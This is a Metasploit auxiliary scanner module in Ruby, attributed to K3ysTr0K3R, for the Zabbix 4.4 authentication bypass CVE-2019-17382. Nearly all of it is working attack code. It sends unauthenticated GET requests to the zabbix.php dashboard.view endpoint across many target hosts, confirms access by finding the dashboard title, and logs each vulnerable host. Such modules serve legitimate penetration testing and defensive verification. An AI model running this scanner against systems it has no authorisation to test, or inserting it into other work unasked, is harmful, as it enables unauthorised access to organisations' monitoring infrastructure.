##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Zabbix <=4.4 - Authentication Bypass',
      'Description'    => %q{
        Zabbix through 4.4 is susceptible to an authentication bypass vulnerability via
        zabbix.php?action=dashboard.view&dashboardid=1. An attacker can bypass the login page
        and access the dashboard page, and then create a Dashboard, Report, Screen, or Map
        without any Username/Password (i.e., anonymously). All created elements
        (Dashboard/Report/Screen/Map) are accessible by other users and by an admin.
      },
      'Author'         => ['K3ysTr0K3R'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2019-17382' ],
          [ 'EDB', '47467' ],
          [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2019-17382' ],
          [ 'URL', 'https://lists.debian.org/debian-lts-announce/2023/08/msg00027.html' ],
          [ 'URL', 'https://github.com/huimzjty/vulwiki' ],
          [ 'URL', 'https://github.com/merlinepedra25/nuclei-templates' ]
        ],
      'DisclosureDate' => '2019-10-10'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Zabbix', '/zabbix' ]),
        Opt::RPORT(80),
        OptBool.new('SSL', [ true, 'Negotiate SSL for outgoing connections', false ])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('THREADS', [ true, 'The number of concurrent threads', 1 ])
      ]
    )
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path, 'zabbix.php?action=dashboard.view&dashboardid=1')

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'     => uri,
      'rhost'   => ip,
      'rport'   => rport,
      'ssl'     => ssl
    })

    if res && res.code == 200 && res.body.include?('<title>Dashboard</title>')
      print_good("#{ip} - Authentication bypass successful. Access to dashboard confirmed.")
      store_vuln(ip, 'Authentication Bypass', 'CVE-2019-17382', res.body)
    else
      print_error("#{ip} - Authentication bypass failed or target not vulnerable.")
    end
  end

  def store_vuln(ip, name, cve, details)
    report_vuln(
      host: ip,
      name: name,
      refs: [
        { source: 'CVE', ref: cve }
      ],
      info: details
    )
  end
end
